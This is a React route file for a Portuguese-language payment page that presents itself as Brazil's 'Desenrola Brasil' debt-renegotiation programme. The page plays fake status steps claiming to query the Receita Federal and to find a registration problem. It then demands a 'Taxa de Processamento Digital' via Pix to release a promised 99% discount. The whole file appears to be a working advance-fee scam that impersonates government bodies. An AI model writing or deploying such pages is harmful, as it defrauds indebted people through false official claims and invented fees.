import { createFileRoute } from "@tanstack/react-router";

import { UpsellPage } from "@/components/UpsellPage";
import { UPSELLS } from "@/lib/upsell-config";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Desenrola Brasil — Liberação do Acordo com 99% de desconto" },
      {
        name: "description",
        content:
          "Finalize a Taxa de Processamento Digital via Pix e libere seu acordo de renegociação com até 99% de desconto.",
      },
      { property: "og:title", content: "Desenrola Brasil — Liberação do Acordo" },
      {
        property: "og:description",
        content: "Pague a Taxa de Processamento Digital via Pix e libere seu acordo com 99% de desconto.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Up1,
});

function Up1() {
  return (
    <UpsellPage
      config={UPSELLS.up1}
      copy={{
        headline: "\n",
        startLabel: "Continuar",
        steps: [
          "Consultando base da Receita Federal...",
          "Analisando histórico de dívidas do CPF...",
          "Pendência cadastral detectada no sistema!",
          "Análise concluída!",
        ],
        offer: (
          <>
            Identificamos uma divergência nos dados de quitação. Para validar seu acordo de <b>99% de desconto</b>, é
            necessário realizar o pagamento da <b>Taxa de Processamento Digital</b>.
          </>
        ),
        payLabel: "Pagar Taxa de Processamento",
        footerNote:
          "O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de crédito imediata!",
      }}
    />
  );
}
